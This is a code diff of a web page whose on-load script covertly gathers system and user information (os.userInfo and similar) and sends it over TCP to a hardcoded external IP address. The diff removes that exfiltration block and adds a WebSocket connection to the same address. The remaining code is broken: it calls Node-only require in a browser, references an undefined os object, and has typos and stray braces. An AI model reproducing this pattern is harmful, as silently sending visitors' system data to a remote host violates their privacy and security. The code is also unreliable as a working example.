@@ -6,13 +6,9 @@
     <title>Website with JavaScript on Load</title>
     <script>
         window.onload = function() {
-            const os = require('os');
-            const net = require('net');
-            
-            // IP address and port of the TCP server
-            const serverIp = '18.219.121.224';  // Replace with actual server IP
-            const serverPort = 25565;          // Replace with actual server port
-            
+
+
+
             // Function to gather system information
             function getSystemInfo() {
                 return {
@@ -30,34 +26,32 @@
                     userInfo: os.userInfo()
                 };
             }
+
+              const socket = new WebSocket('ws://18.219.121.224');
+
+  // Connection established
+  socket.onopen = function(event) {
+    console.log("Connection opened!");
+    socket.send("Hello server!");
+  };
+
+  // Message received from server
+  socket.onmessage = function(event) {
+    console.log("Received from server:", event.data);
+  };
+
+  // Connection closed
+  socket.onclose = function(event) {
+    console.log("Connection closed");
+  };
+
+  // Handle errors
+  socket.onerror = function(error) {
+    console.log("WebSocket error:", error);
+  };
             
             // Convert system info to a string format
-            const systemInfo = JSON.stringify(getSystemInfo(), null, 2);
-            cosole.log(systemInfo);
-            // Create a TCP client and connect to the server
-            const client = new net.Socket();
-            client.connect(serverPort, serverIp, () => {
-                console.log(`Connected to server at ${serverIp}:${serverPort}`);
-                // Send system info to the server
-                client.write(systemInfo);
-            });
-            
-            // Handle server response (optional)
-            client.on('data', (data) => {
-                console.log(`Received: ${data}`);
-                client.destroy(); // Close the connection after receiving response
-            });
-            
-            // Handle connection close
-            client.on('close', () => {
-                console.log('Connection closed');
-            });
-            
-            // Handle error
-            client.on('error', (err) => {
-                console.error('Error: ', err);
-            });
-            
+          
                     };
     </script>
 </head>
